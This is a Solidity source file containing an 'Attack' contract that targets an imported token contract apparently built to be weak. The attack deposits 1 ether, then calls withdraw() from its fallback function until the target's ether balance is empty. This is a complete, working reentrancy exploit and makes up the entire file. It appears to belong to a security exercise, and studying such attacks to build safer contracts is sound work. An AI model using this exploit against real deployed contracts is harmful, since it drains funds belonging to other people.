// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "contracts/BohdanERC20Token_weak.sol";

contract Attack {

    BohdanERC20Token public erc20;

    constructor(address _token) {
        erc20 = BohdanERC20Token(_token);
    }

    fallback() external payable {
        if (address(erc20).balance > 0) {
            erc20.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Not enough ether");
        erc20.deposit{value: 1 ether}();
        erc20.withdraw();
    }
}